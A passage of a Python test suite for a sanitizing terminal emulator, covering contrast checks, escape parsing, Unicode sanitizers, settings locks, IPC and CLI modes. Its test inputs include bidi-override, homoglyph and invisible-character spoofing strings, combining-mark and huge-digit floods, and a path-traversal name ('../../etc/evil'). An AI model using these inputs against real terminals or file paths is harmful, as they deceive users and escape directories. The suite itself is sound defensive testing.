ok(S.too_close(BLACK, DARK_BG) is True, 'black on dark too close (guarded)')
ok(S.too_close(RED, DARK_BG) is False, 'red on dark is fine')
ok(S.too_close(GREEN, DARK_BG) is False, 'green on dark is fine')
ok(S.too_close(WHITE, WHITE) is True, 'white on white too close')

# --- colours: exhaustive luminance + too_close analysis -----------------------
# The whole contrast guard rests on these two pure functions, so pin their exact
# behaviour rather than trusting a handful of spot cases.
eq(S.luminance(BLACK), 0.0, 'luminance of black is 0')
eq(round(S.luminance(WHITE)), 255, 'luminance of white is 255 (weights sum to 1)')
# the ITU weights: a pure channel weighs its coefficient x 255.
eq(round(S.luminance((255, 0, 0))), round(0.299 * 255), 'red channel weight is 0.299')
eq(round(S.luminance((0, 255, 0))), round(0.587 * 255), 'green channel weight is 0.587')
eq(round(S.luminance((0, 0, 255))), round(0.114 * 255), 'blue channel weight is 0.114')
# luminance is monotonic up a grey ramp (brighter grey -> higher luminance).
_ramp = [S.luminance((g, g, g)) for g in range(0, 256, 17)]
ok(all(b > a for a, b in zip(_ramp, _ramp[1:])), 'luminance rises monotonically on a grey ramp')
# too_close is symmetric and reflexive, and keys ONLY on the luminance gap (30).
ok(all(S.too_close((g, g, g), (g, g, g)) for g in range(0, 256, 15)),
   'too_close is reflexive: any colour collides with itself (text cannot vanish)')
ok(S.too_close(RED, GREEN) == S.too_close(GREEN, RED), 'too_close is symmetric')
# threshold boundary: a gap of exactly 30 is allowed; 29 is not (strict "< 30").
# grey g has luminance == g, so two greys 30 apart have a gap of exactly 30.
ok(S.too_close((100, 100, 100), (129, 129, 129)) is True, 'a 29-luminance gap is too close')
ok(S.too_close((100, 100, 100), (130, 130, 130)) is False, 'a 30-luminance gap is allowed (boundary)')
# a striking case the eye would miss: pure red on pure green have IDENTICAL-ish
# luminance gap, so the guard treats a saturated same-lightness pair as unreadable.
ok(S.too_close((150, 0, 0), (0, 76, 0)) is True,
   'two hues at matched luminance are flagged (colour alone is not contrast)')

# --- colours: SGR parser ------------------------------------------------------
def sgr(param):
    state = {'fg': None, 'bg': None, 'bold': False}
    return S.parse_sgr(param, state)

eq(sgr('31'), {'fg': 1, 'bg': None, 'bold': False}, 'sgr 31 = red fg')
eq(sgr('42'), {'fg': None, 'bg': 2, 'bold': False}, 'sgr 42 = green bg')
eq(sgr('91'), {'fg': 9, 'bg': None, 'bold': False}, 'sgr 91 = bright red fg')
eq(sgr('1'), {'fg': None, 'bg': None, 'bold': True}, 'sgr 1 = bold')
eq(sgr('1;22'), {'fg': None, 'bg': None, 'bold': False}, 'sgr 22 = bold off')
# a non-ASCII "digit" (isdigit() True but int() rejects it) must not crash the
# parser (found by the SGR fuzz harness); it is treated as a 0/no-op parameter.
eq(sgr(chr(0x00B2)), {'fg': None, 'bg': None, 'bold': False},
   'sgr with a non-ASCII digit is a safe no-op, not a crash')
eq(sgr('1;31;42'), {'fg': 1, 'bg': 2, 'bold': True}, 'sgr combined')
eq(sgr('31;0'), {'fg': None, 'bg': None, 'bold': False}, 'sgr 0 resets')
eq(sgr(''), {'fg': None, 'bg': None, 'bold': False}, 'empty sgr = reset')
eq(sgr('39;49'), {'fg': None, 'bg': None, 'bold': False}, 'default fg/bg')
# 256-colour and 24-bit truecolour are honoured (colour is passive + contrast-
# guarded): a 256 index 0-15 stays a palette index, 16-255 and truecolour become
# an explicit #rrggbb; the extra params are consumed, following codes still parse.
eq(sgr('38;5;196'), {'fg': '#ff0000', 'bg': None, 'bold': False},
   '256-colour fg (index 196 -> #ff0000)')
eq(sgr('38;5;3'), {'fg': 3, 'bg': None, 'bold': False},
   '256-colour index < 16 stays a palette index')
eq(sgr('48;5;240'), {'fg': None, 'bg': '#585858', 'bold': False},
   '256-colour bg (greyscale ramp)')
eq(sgr('38;2;10;20;30'), {'fg': '#0a141e', 'bg': None, 'bold': False},
   '24-bit truecolour fg')
eq(sgr('38;5;196;1'), {'fg': '#ff0000', 'bg': None, 'bold': True},
   '256-colour then bold: both apply, params consumed correctly')
eq(S.color_256(231), '#ffffff', 'color_256: cube corner is white')
eq(S.color_256(16), '#000000', 'color_256: cube start is black')
ok(S.color_256(300) is None, 'color_256: out-of-range -> None')

# --- tui_cell: one-character-wide, grid-preserving cell sanitization ----------
# A neutralized cell renders as the BOX placeholder (U+25A1), the SAME single-
# column mark CLI box/show mode draws, so box/reveal/detail look identical in both
# modes instead of a bare '_'. Copy still maps the box back to '_' on export.
eq(S.tui_cell('A', 'box'), 'A', 'tui ascii kept')
eq(S.tui_cell(CAFE[-1], 'box'), S.BOX, 'tui box non-ascii -> box placeholder')
eq(S.tui_cell(CAFE[-1], 'show'), CAFE[-1], 'tui show renders glyph')
eq(S.tui_cell(chr(0x2500), 'show'), chr(0x2500), 'tui show renders box-drawing')
eq(S.tui_cell(BIDI, 'show'), S.BOX, 'tui show still neutralizes bidi -> box')
eq(S.tui_cell(ZWSP, 'show'), S.BOX, 'tui show still neutralizes zero-width -> box')
eq(S.tui_cell(BEL, 'box'), S.BOX, 'tui control -> box placeholder')
# reveal cannot show a <U+XXXX> badge in a fixed cell, so in TUI it collapses to
# the box placeholder (like box mode) -- never the raw glyph, which would render a
# homoglyph deceptively under the green "reveal is safe" lamp.
eq(S.tui_cell(CAFE[-1], 'reveal'), S.BOX, 'tui reveal is box placeholder, not the glyph')
eq(S.tui_cell(BIDI, 'reveal'), S.BOX, 'tui reveal neutralizes bidi one-wide')
eq(S.tui_cell('', 'box'), ' ', 'tui empty cell -> space')
# a pyte cell may be a multi-codepoint grapheme (base + combining) -> must not
# crash (this is what "cat /dev/random" in show mode hit)
_grapheme = 'a' + chr(0x0301)                    # a + combining acute
eq(S.tui_cell(_grapheme, 'show'), _grapheme, 'tui multi-cp grapheme kept in show')
eq(S.tui_cell(_grapheme, 'box'), S.BOX, 'tui multi-cp grapheme -> box in box mode')
eq(S.tui_cell('a' + BEL, 'show'), S.BOX, 'tui grapheme with a control -> box')
ok(isinstance(S.tui_cell(chr(0x1F600) + chr(0x1F600), 'show'), str),
   'tui two-astral cell does not crash')

# --- marking_cp_for_cell: the source code point a NEUTRALIZED grid cell is
# --- classified/coloured by (the TUI-grid counterpart of the CLI cells_to_runs
# --- MARK_KEY tag). The FIRST code point that is not plain printable ASCII, so a
# --- base+combining grapheme classifies by its dangerous mark, not its ASCII base.
eq(S.marking_cp_for_cell(BIDI), 0x202E, 'marking cp: a lone RLO is the RLO')
eq(S.marking_cp_for_cell(chr(0x0430)), 0x0430, 'marking cp: a homoglyph is itself')
eq(S.marking_cp_for_cell(chr(0x2500)), 0x2500, 'marking cp: a box-drawing glyph is itself')
eq(S.marking_cp_for_cell('a' + ZWSP), 0x200B,
   'marking cp: base+zero-width classifies by the zero-width, not the ASCII base')
eq(S.marking_cp_for_cell('a' + BEL), 0x07, 'marking cp: base+control classifies by the control')
eq(S.marking_cp_for_cell('abc'), None, 'marking cp: pure printable ASCII is not a marking')
eq(S.marking_cp_for_cell(''), None, 'marking cp: an empty cell is not a marking')
# tui_cell returning the box placeholder GUARANTEES a marking code point exists, so
# the grid colouring can classify without a None fallback (checked for every mode).
for _mode in ('box', 'show', 'reveal', 'detail'):
    for _ch in (BIDI, ZWSP, chr(0x2500), chr(0x00E9), 'a' + BEL, 'a' + chr(0xFE0F)):
        if S.tui_cell(_ch, _mode) == S.BOX:
            ok(S.marking_cp_for_cell(_ch) is not None,
               'marking cp: a boxed cell (%r/%s) always has a classifiable code point' % (_ch, _mode))

# --- preflight: fail loud (stderr + non-zero exit) on a missing dependency ----
from secure_terminal import preflight as PRE      # noqa: E402
import io as _pio                                 # noqa: E402
import contextlib as _pcl                         # noqa: E402
PRE.require(('sys', 'python3'), ('os', 'python3'))   # all present -> no-op
ok(True, 'preflight.require is a no-op when every dependency is present')


def _pre_run(*deps):
    err = _pio.StringIO()
    rc = 0
    try:
        with _pcl.redirect_stderr(err):
            PRE.require(*deps)
    except SystemExit as exc:
        rc = exc.code
    return rc, err.getvalue()


_prc, _pmsg = _pre_run(('secure_terminal_missing_dep_xyz', 'python3-nonesuch'))
ok(_prc == 1 and 'secure_terminal_missing_dep_xyz' in _pmsg
   and 'missing dependency' in _pmsg
   and 'sudo apt install python3-nonesuch' in _pmsg,
   'preflight.require exits 1, naming the module + a Debian install hint on stderr')
_prc2, _pmsg2 = _pre_run(('secure_terminal_absent_pkg_xyz.submod', 'python3-x'))
ok(_prc2 == 1 and 'secure_terminal_absent_pkg_xyz.submod' in _pmsg2,
   'preflight.require handles a dotted name whose parent is absent')

# apply_line_edits: the pure line-editing model behind the fast bulk render path
eq(S.apply_line_edits('', 0, 'abc'), ([], 'abc', 3), 'line edits: plain append')
_cl, _ln, _col = S.apply_line_edits('', 0, 'l1\nl2\n')
eq((_cl, _ln), (['l1', 'l2'], ''), 'line edits: newline splits off completed lines')
eq(S.apply_line_edits('123456', 6, '\rAB'), ([], 'AB3456', 2),
   'line edits: bare CR then overwrite')
_cl, _ln, _col = S.apply_line_edits('abc', 3, '\x08 \x08')
eq((_ln.rstrip(), _col), ('ab', 2), 'line edits: backspace erase')
# max_line hard-wraps a runaway newline-free line so a flood cannot build one
# unbounded block
_cl, _ln, _col = S.apply_line_edits('', 0, 'x' * 25, 10)
eq((len(_cl), [len(_c) for _c in _cl], _ln), (2, [10, 10], 'xxxxx'),
   'line edits: max_line wraps a runaway line')
# classify_paste: name and count the hidden classes so the paste warning can say
# exactly what a copied string carries
eq(S.classify_paste('echo hello'), [], 'clean ASCII has no findings')
_pc = dict(S.classify_paste('pay' + chr(0x0430) + 'l' + chr(0x202E)
                            + chr(0x200B) + BEL))
eq(_pc.get('bidirectional control'), 1, 'classify: bidi override counted')
eq(_pc.get('invisible character'), 1, 'classify: zero-width counted')
eq(_pc.get('non-ASCII character'), 1, 'classify: homoglyph counted')
eq(_pc.get('control character'), 1, 'classify: control counted')
# sanitize_paste_unicode: keeps printable non-ASCII, drops the deceptive classes
eq(S.sanitize_paste_unicode('caf' + chr(0x00E9)), 'caf' + chr(0x00E9),
   'unicode paste keeps printable non-ASCII')
ok(chr(0x202E) not in S.sanitize_paste_unicode('a' + chr(0x202E) + 'b'),
   'unicode paste drops a bidi override')
eq(S.sanitize_paste_unicode('a\nb'), 'a\rb', 'unicode paste: newline -> CR')

# --- sanitize_clipboard(_unicode): text safe to place on the system clipboard --
# Like the paste sanitizers but newlines are PRESERVED (clipboard text is
# multi-line content, not a shell submission).
eq(S.sanitize_clipboard_unicode('caf' + chr(0x00E9) + '\nx\ty'),
   'caf' + chr(0x00E9) + '\nx\ty', 'clipboard-unicode keeps printable non-ASCII + nl/tab')
ok(chr(0x202E) not in S.sanitize_clipboard_unicode('a' + chr(0x202E) + chr(0x200B) + 'b')
   and chr(0x200B) not in S.sanitize_clipboard_unicode('a' + chr(0x200B) + 'b'),
   'clipboard-unicode drops bidi/zero-width (the deceptive classes)')
ok(chr(0x85) not in S.sanitize_clipboard_unicode('a' + chr(0x85) + 'b'),
   'clipboard-unicode drops a C1 control')
eq(S.sanitize_clipboard('ex' + chr(0x0430) + 'mple\nok'), 'exmple\nok',
   'clipboard (ASCII) drops the cyrillic homoglyph, keeps the newline')
eq(S.sanitize_clipboard('a\x1b[31mb'), 'a[31mb', 'clipboard (ASCII) drops the ESC control')
# default-ignorable characters that str.isprintable() KEEPS (variation selectors,
# combining grapheme joiner, Hangul fillers) are invisible on their own -> the
# unicode-keeping sanitizers still drop them, so they cannot ride out.
ok(chr(0xFE0F) not in S.sanitize_clipboard_unicode('a' + chr(0xFE0F) + 'b'),
   'clipboard-unicode drops a variation selector (invisible, but isprintable)')
ok(chr(0x034F) not in S.sanitize_paste_unicode('a' + chr(0x034F) + 'b'),
   'unicode paste drops the combining grapheme joiner')
ok(chr(0x3164) not in S.sanitize_clipboard_unicode('a' + chr(0x3164) + 'b'),
   'clipboard-unicode drops a Hangul filler')
# but ORDINARY combining marks (a real accent) are NOT default-ignorable -> kept,
# so legitimate decomposed text (cafe + combining acute) survives.
eq(S.sanitize_clipboard_unicode('cafe' + chr(0x0301)), 'cafe' + chr(0x0301),
   'a real combining accent is kept (decomposed text is not mangled)')
ok(S.is_default_ignorable(chr(0xFE0F)) and not S.is_default_ignorable(chr(0x0301)),
   'is_default_ignorable: a variation selector yes, a combining accent no')

# --- feed_line_edits combining-mark cap: a base plus a flood of combining marks
# renders as one grapheme cluster the text engine reshapes in O(n^2) (seconds of
# GUI freeze). The CLI cell model drops marks past the Unicode stream-safe cap of
# 30. Capping HERE (after escapes are stripped, on persisted cells) is escape- and
# read-boundary-proof; lossless for real decomposed text.
_acute = chr(0x0301)                                   # combining acute
def _mark_cells(cells):
    return sum(1 for _c, _ in cells if _c == _acute)
_cmp, _cells, _col, _sg, _wr = S.feed_line_edits([], 0, {}, 'a' + _acute * 100)
eq(_mark_cells(_cells), 32,
   'feed_line_edits: a 100-mark flood on one base is bounded to 32 mark-cells')
# a stripped SGR between mark-blocks must NOT reset the cap (it leaves no cell, so
# the marks stay adjacent to the one base) -- the escape-reset bypass
_cmp, _cells, _col, _sg, _wr = S.feed_line_edits(
    [], 0, {}, 'a' + (_acute * 20 + '\x1b[0m') * 5)
eq(_mark_cells(_cells), 32,
   'feed_line_edits: a stripped SGR between mark-blocks cannot reset the cap')
# short real combining clusters (a base resets the run) are preserved in full
_cmp, _cells, _col, _sg, _wr = S.feed_line_edits([], 0, {}, 'e' + _acute + 'o' + _acute)
eq([_c for _c, _ in _cells], ['e', _acute, 'o', _acute],
   'feed_line_edits: short real combining clusters are preserved')
eq(len(S.feed_line_edits([], 0, {}, 'x' + _acute * 30)[1]), 31,
   'feed_line_edits: exactly 30 marks (stream-safe conformant) kept in full')
# split across calls: the persisted `cells` make the cap read-boundary-proof
_cmp, _cells, _col, _sg, _wr = S.feed_line_edits([], 0, {}, 'a' + _acute * 20)
for _ in range(5):
    _cmp, _cells, _col, _sg, _wr = S.feed_line_edits(_cells, _col, _sg, _acute * 20)
eq(_mark_cells(_cells), 32,
   'feed_line_edits: a flood split across chunks stays bounded (cells persist)')
# overwrite-join: two sub-cap runs separated by a base, then a cursor move (CSI G)
# overwrites the separator with a mark. Scanning only the LEFT would let each such
# overwrite pass while fusing the runs; the two-sided scan refuses it.
def _max_mark_run(cells):
    _m = _r = 0
    for _c, _ in cells:
        if _c == _acute:
            _r += 1
            _m = max(_m, _r)
        else:
            _r = 0
    return _m
_raw = 'a' + _acute * 20 + 'b' + _acute * 20 + '\x1b[22G' + _acute
_cmp, _cells, _col, _sg, _wr = S.feed_line_edits([], 0, {}, _raw)
ok(_max_mark_run(_cells) <= 32,
   'feed_line_edits: overwriting a separator cannot fuse two runs past the cap')
# writing a mark to the LEFT of an already-full (32-mark) run must also be refused
# -- exercises the right-hand scan reaching the cap
_raw2 = 'a' + _acute * 40 + '\x1b[1G' + _acute          # 40 -> capped 32, then write at col 0
_cmp, _cells2, _c2, _s2, _w2 = S.feed_line_edits([], 0, {}, _raw2)
ok(_max_mark_run(_cells2) <= 32 and _cells2[0][0] == 'a',
   'feed_line_edits: writing left of a full mark-run is refused (right-side cap)')
# a grapheme-extending mark whose canonical combining class is 0 (U+093E, category
# Mc) must be capped too -- detection is by mark CATEGORY, not combining class, so
# ccc cannot be used to slip a flood past the cap
_maa = chr(0x093E)                                     # Devanagari vowel sign AA (Mc, ccc 0)
_cmp, _cells, _col, _sg, _wr = S.feed_line_edits([], 0, {}, 'a' + _maa * 100)
eq(sum(1 for _c, _ in _cells if _c == _maa), 32,
   'feed_line_edits: a class-0 mark (ccc 0, category Mc) flood is still bounded to 32')

# --- numeric-parameter crash guard: Python 3.11+ raises ValueError converting an
# int string longer than 4300 digits. A terminal parameter is a few digits, so a
# huge digit run in untrusted output must be rejected before int(), never crash the
# parser (which runs in a Qt notifier slot).
eq(S._safe_int('42'), 42, '_safe_int: a short ASCII digit run parses')
eq(S._safe_int('9' * 5000), 0, '_safe_int: an over-long run is rejected (no ValueError)')
eq(S._safe_int('9' * 5000, None), None, '_safe_int: a rejected run returns the default')
eq(S._safe_int(chr(0xFF11)), 0, '_safe_int: a non-ASCII digit (int() rejects) is rejected')
# a CSI cursor op with a 5000-digit parameter must not crash feed_line_edits
_cmp, _cells, _col, _sg, _wr = S.feed_line_edits([], 0, {}, 'a\x1b[' + '9' * 5000 + 'Cb')
ok(any(_c == 'a' for _c, _ in _cells),
   'feed_line_edits: a 5000-digit CSI parameter does not crash (the huge run is consumed)')
# an SGR with a 5000-digit parameter must not crash parse_sgr
_sgr_state = {'fg': None, 'bg': None, 'bold': False}
S.parse_sgr('9' * 5000, _sgr_state)
ok(_sgr_state == {'fg': None, 'bg': None, 'bold': False},
   'parse_sgr: a 5000-digit parameter is a no-op, not a crash')

# --- sanitize_title: program-supplied title / notification -> safe ASCII ------
eq(S.sanitize_title('My Build'), 'My Build', 'title plain ascii')
eq(S.sanitize_title('ev' + BIDI + 'il'), 'evil', 'title strips bidi')
eq(S.sanitize_title('a\tb\nc'), 'a b c', 'title collapses whitespace')
eq(S.sanitize_title(CAFE), 'caf', 'title drops non-ascii')
eq(S.sanitize_title('x' * 200)[:5], 'xxxxx', 'title capped')
ok(len(S.sanitize_title('x' * 200)) <= 80, 'title length limit')
eq(S.sanitize_title(''), '', 'title empty')
eq(S.sanitize_title(None), '', 'title none-safe')
# Regression (found by ClusterFuzzLite/Atheris): collapse-then-cap could leave a
# trailing space when the cap landed on one, so re-sanitizing shrank the title by
# a character. sanitize_title must be idempotent.
_capped_on_space = S.sanitize_title('a ' * 60)
eq(_capped_on_space, S.sanitize_title(_capped_on_space), 'title idempotent (cap on space)')
ok(not _capped_on_space.endswith(' '), 'title no trailing space after cap')

# --- constants ----------------------------------------------------------------
ok(len(S.ANSI_PALETTE) == 16, '16-colour palette')
ok(S.DISPLAY_MODES == ('box', 'show', 'reveal', 'detail'), 'display modes')
ok(set(S.THEMES) == {'dark', 'light'}, 'themes')

# --- HTML-injection safety: the widget layer must not use an HTML sink --------
# secure-terminal shows output via QPlainTextEdit.insertText (plain text), never
# an HTML-rendering path, so a printed "<b>" or "<script>" is inert. Guard that
# no forbidden API creeps in.
pkg_dir = os.path.dirname(os.path.abspath(S.__file__))
forbidden = ['setHtml', 'insertHtml', 'appendHtml', 'setMarkdown',
             'QTextBrowser', 'mightBeRichText', '.toHtml(']
# A missing file is a FAIL, not a skip: a renamed module must not drop out of
# this scan unnoticed (dialog.py -> review.py did exactly that).
for name in ('terminal.py', 'main.py', 'review.py'):
    path = os.path.join(pkg_dir, name)
    src = None
    try:
        with open(path, encoding='utf-8') as handle:
            src = handle.read()
    except OSError as exc:
        ok(False, 'HTML-sink scan cannot read %s: %s' % (name, exc))
    if src is None:
        continue
    for bad in forbidden:
        ok(bad not in src, 'HTML sink %r absent from %s' % (bad, name))

# --- fuzz harnesses must import names that still exist -----------------------
# The atheris harnesses live outside the package and are compiled only by the
# ClusterFuzzLite job, so a rename in the package breaks them where nothing
# routine looks (STRIP_BOX -> BOX did exactly that, and every nightly fuzz build
# failed for over a week). Resolve their imports statically, on every run.
import ast                                          # noqa: E402

repo_root = pkg_dir
for _ in range(5):                                  # .../usr/lib/python3/dist-packages/secure_terminal
    repo_root = os.path.dirname(repo_root)
fuzz_dir = os.path.join(repo_root, 'fuzz')


def module_level_names(source_path):
    """Names a module binds at top level (defs, classes, assignments, imports)."""
    with open(source_path, encoding='utf-8') as src_handle:
        tree = ast.parse(src_handle.read())
    names = set()
    for node in tree.body:
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef,
                             ast.ClassDef)):
            names.add(node.name)
        elif isinstance(node, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Name):
                    names.add(target.id)
        elif isinstance(node, ast.AnnAssign) and isinstance(node.target, ast.Name):
            names.add(node.target.id)
        elif isinstance(node, (ast.Import, ast.ImportFrom)):
            for alias in node.names:
                names.add(alias.asname or alias.name.split('.')[0])
    return names


ok(os.path.isdir(fuzz_dir), 'fuzz harness dir present (%s)' % fuzz_dir)
if os.path.isdir(fuzz_dir):
    exported = {}
    for name in sorted(os.listdir(pkg_dir)):
        if name.endswith('.py'):
            exported[name[:-3]] = module_level_names(os.path.join(pkg_dir, name))

    harnesses = sorted(n for n in os.listdir(fuzz_dir) if n.endswith('.py'))
    ok(len(harnesses) > 0, 'at least one fuzz harness present')
    for name in harnesses:
        with open(os.path.join(fuzz_dir, name), encoding='utf-8') as handle:
            tree = ast.parse(handle.read())
        for node in ast.walk(tree):
            if not isinstance(node, ast.ImportFrom):
                continue
            if not (node.module or '').startswith('secure_terminal'):
                continue
            parts = node.module.split('.')
            if len(parts) < 2:
                # `from secure_terminal import settings as SET` -- submodules.
                for alias in node.names:
                    ok(alias.name in exported,
                       'fuzz/%s: secure_terminal.%s exists' % (name, alias.name))
                continue
            submodule = parts[1]
            ok(submodule in exported,
               'fuzz/%s: module secure_terminal.%s exists' % (name, submodule))
            for alias in node.names:
                ok(alias.name in exported.get(submodule, set()),
                   'fuzz/%s: name %s.%s exists' % (name, submodule, alias.name))

# --- the coverage gate must select a thread-safe core ------------------------
# test_mainwin drives a REAL single-instance ipc handoff with the client in a
# background thread while the server side (on_ready) runs on the main thread in
# the Qt event loop. Under coverage's default C tracer (per-thread sys.settrace)
# the two traced threads race Qt native code and the SIGCHLD that reaps the
# windows' pty children -> an intermittent SIGSEGV (exit 139) mid-gate. The gate
# must select sys.monitoring (PEP 669), which does not use sys.settrace. This
# guards the selection so it cannot be silently dropped (which would return the
# flake). Runner lives in the dist-ai repo, two levels up from this suite dir.
_cov_runner = os.path.normpath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    '..', '..', 'bin', 'secure-terminal-tests-coverage'))
ok(os.path.isfile(_cov_runner),
   'coverage runner present (%s)' % _cov_runner)
if os.path.isfile(_cov_runner):
    with open(_cov_runner, encoding='utf-8') as _crh:
        _cov_src = _crh.read()
    ok('COVERAGE_CORE=sysmon' in _cov_src and 'coverage.sysmon' in _cov_src,
       'coverage gate selects the thread-safe sys.monitoring core '
       '(guards the C-tracer SIGSEGV on the threaded ipc handoff)')

# --- session persistence (pure JSON under a temp state dir) -------------------
import tempfile                                    # noqa: E402
os.environ['XDG_STATE_HOME'] = tempfile.mkdtemp(prefix='st-session-')
from secure_terminal import session as SESS       # noqa: E402

eq(SESS.load(), [], 'no session -> empty list')
_tabs = [{'name': 'a', 'text': 'l1\nl2\nl3', 'zoom': 100},
         {'name': 'b', 'text': 'x'}]
SESS.save(_tabs)
eq(SESS.load(), _tabs, 'session round-trips')
# each tab's scrollback is its own log file; the index json holds no bulk text
import glob as _glob                                # noqa: E402
_sdir = os.path.join(os.environ['XDG_STATE_HOME'], 'secure-terminal')
eq(len(_glob.glob(os.path.join(_sdir, 'tab-*.log'))), 2, 'one log file per tab')
with open(os.path.join(_sdir, 'tab-0.log'), encoding='utf-8') as _h:
    eq(_h.read(), 'l1\nl2\nl3', 'tab-0 log holds that tab scrollback')
with open(SESS.session_path(), encoding='utf-8') as _h:
    ok('l1\nl2\nl3' not in _h.read(), 'index json holds no scrollback text')
SESS.save(_tabs[:1])
eq(len(_glob.glob(os.path.join(_sdir, 'tab-*.log'))), 1,
   'stale per-tab log removed when the tab count shrinks')
SESS.clear()
eq(_glob.glob(os.path.join(_sdir, 'tab-*.log')), [],
   'clear removes every per-tab log')
eq(SESS.load(), [], 'cleared session -> empty')
eq(SESS.cap_text('\n'.join(str(i) for i in range(10)), 3), '7\n8\n9',
   'cap_text keeps the tail')
ok(len(SESS.cap_text('\n'.join(str(i) for i in range(9999)), 0).split('\n'))
   <= SESS.UNLIMITED_PERSIST_LINES, 'unlimited scrollback is capped')
with open(SESS.session_path(), 'w', encoding='utf-8') as _h:
    _h.write('{ not valid json')
eq(SESS.load(), [], 'corrupt session -> empty, no crash')

# --- settings drop-in: precedence, lexical order, .conf-only ------------------
from secure_terminal import settings as SET       # noqa: E402
_sysd = tempfile.mkdtemp(prefix='st-sys-')
_usrd = tempfile.mkdtemp(prefix='st-usr-')
SET._system_dirs = lambda: [_sysd]                 # privileged (root) dir
SET._user_config_dir = lambda: _usrd               # user dir (highest)
with open(os.path.join(_sysd, '10-seed.conf'), 'w', encoding='utf-8') as _h:
    _h.write('theme=dark\nzoom=100\n')
with open(os.path.join(_usrd, '90-user.conf'), 'w', encoding='utf-8') as _h:
    _h.write('theme=light\n')
eq(SET.load().get('theme'), 'light', 'settings: user dir overrides system seed')
eq(SET.load().get('zoom'), '100', 'settings: un-overridden seed value kept')
with open(os.path.join(_usrd, '99-z.conf'), 'w', encoding='utf-8') as _h:
    _h.write('theme=dark\n')
eq(SET.load().get('theme'), 'dark', 'settings: lexical order, later file wins')
with open(os.path.join(_usrd, 'ignore.txt'), 'w', encoding='utf-8') as _h:
    _h.write('theme=light\n')
eq(SET.load().get('theme'), 'dark', 'settings: only .conf files are parsed')
SET.save({'colors': 'true'})
ok(SET.user_config_file().endswith('50_user.conf'),
   'settings: app writes 50_user.conf')
eq(SET.load().get('colors'), 'true', 'settings: written value loads back')

# admin lock: a privileged `lock=` makes a key non-overridable by the user dir
with open(os.path.join(_sysd, '20-lock.conf'), 'w', encoding='utf-8') as _h:
    _h.write('colors=false\nlock=colors\n')
with open(os.path.join(_usrd, '95-try.conf'), 'w', encoding='utf-8') as _h:
    _h.write('colors=true\n')
_lc = SET.load()
eq(_lc.get('colors'), 'false', 'settings: locked key keeps the admin value')
eq(list(_lc.violations), ['colors'], 'settings: ignored override recorded')
ok('colors' in _lc.locked, 'settings: lock reported')
# a user config cannot lock a key
with open(os.path.join(_usrd, '96-userlock.conf'), 'w', encoding='utf-8') as _h:
    _h.write('theme=light\nlock=theme\n')
ok('theme' not in SET.load().locked, 'settings: a user config cannot lock a key')
# privileged-only keys (remote_control): admin-only, no lock= needed
ok('remote_control' in SET.load().locked,
   'settings: remote_control is always privileged (auto-locked)')
with open(os.path.join(_usrd, '97-rc.conf'), 'w', encoding='utf-8') as _h:
    _h.write('remote_control=true\n')
eq(SET.load().get('remote_control'), None,
   'settings: a user config cannot enable remote_control')
with open(os.path.join(_sysd, '25-rc.conf'), 'w', encoding='utf-8') as _h:
    _h.write('remote_control=true\n')
eq(SET.load().get('remote_control'), 'true',
   'settings: only a privileged dir can enable remote_control')

# --- ipc: single-instance socket helpers (Qt-free) ----------------------------
import struct                                          # noqa: E402
from secure_terminal import ipc as IPC                # noqa: E402
# a group name can never escape the socket directory (path traversal)
ok(os.path.basename(IPC.socket_path('../../etc/evil')).endswith('.sock')
   and '/' not in os.path.basename(IPC.socket_path('a/b/c')),
   'ipc: group name is reduced to a safe filename')
eq(IPC.socket_path(''), IPC.socket_path('default'), 'ipc: empty group -> default')
# Framer reassembles a length-prefixed frame across chunks
_fr = IPC.Framer()
_full = IPC.frame(b'hello')
ok(_fr.feed(_full[:3]) is None, 'ipc: framer waits for the length prefix')
eq(_fr.feed(_full[3:]), b'hello', 'ipc: framer returns the completed payload')
_over = IPC.Framer()
raised = False
try:
    _over.feed(struct.pack('<I', 1 << 30) + b'x')
except ValueError:
    raised = True
ok(raised, 'ipc: an over-long frame is rejected')
# no server in a fresh group -> no reply (client would start a new instance)
os.environ['XDG_RUNTIME_DIR'] = tempfile.mkdtemp()
ok(IPC.send_request('nobody-home', {'op': 'ping'}, timeout=0.2) is None,
   'ipc: no running instance -> None')

# --- CLI: the sanitizing pty wrapper shares the sanitize core ------------------
import subprocess                                   # noqa: E402


def _run_cli(args, timeout=30):
    """Run secure-terminal-cli with `args` (a list), stdin from /dev/null, and
    return (stdout_text, exit_code). Invoked via the module so PYTHONPATH from
    the running suite locates it in a checkout."""
    code = ('import sys\n'
            'from secure_terminal.cli import main\n'
            'sys.exit(main(%r))\n' % (args,))
    proc = subprocess.run(
        [sys.executable, '-c', code],
        env=dict(os.environ, PYTHONPATH=os.pathsep.join(sys.path)),
        stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL, timeout=timeout)
    return proc.stdout.decode('utf-8', 'replace'), proc.returncode


# printf interprets the backslash-octal, so pass LITERAL backslashes (a single
# Python backslash would be interpreted here and then double-encoded through argv)
# box mode: escapes removed, text kept, bidi neutralized to _
_o, _ = _run_cli(['--mode', 'box', '--', 'printf',
                  'X\\033[31mRED\\033[0m Y\\342\\200\\256Z'])
ok('\x1b' not in _o and 'RED' in _o, 'cli box: escapes gone, text kept')
ok('_' in _o and chr(0x202E) not in _o, 'cli box: bidi -> _')
# show mode: printable non-ASCII kept, escapes still gone
_o, _ = _run_cli(['--mode', 'show', '--', 'printf', 'caf\\303\\251 \\033[1mB\\033[0m'])
ok(chr(0x00E9) in _o and '\x1b' not in _o, 'cli show: unicode kept, escapes gone')
# reveal mode: non-ASCII as <U+XXXX>
_o, _ = _run_cli(['--mode', 'reveal', '--', 'printf', 'a\\342\\200\\256b'])
ok('<U+202E>' in _o, 'cli reveal: bidi as <U+XXXX> badge')
# the child exit code is forwarded
_o, _rc = _run_cli(['--', 'sh', '-c', 'exit 42'])
eq(_rc, 42, 'cli forwards the child exit code')
# the two safe cursor controls (backspace, carriage return) pass through
_o, _ = _run_cli(['--', 'printf', 'a\x08b\rc'])
ok('\x08' in _o and '\r' in _o, 'cli keeps backspace and carriage return')
# any other control character is neutralized to _ in box mode
_o, _ = _run_cli(['--mode', 'box', '--', 'printf', 'x\x01y'])
ok('_' in _o and '\x01' not in _o, 'cli box: a control char (SOH) becomes _')
# the default mode is detail: the same control char is named, raw byte gone
_o, _ = _run_cli(['--', 'printf', 'x\x01y'])
ok('<U+0001' in _o and '\x01' not in _o,
   'cli default mode is detail (SOH shown as a <U+0001> badge, raw byte gone)')
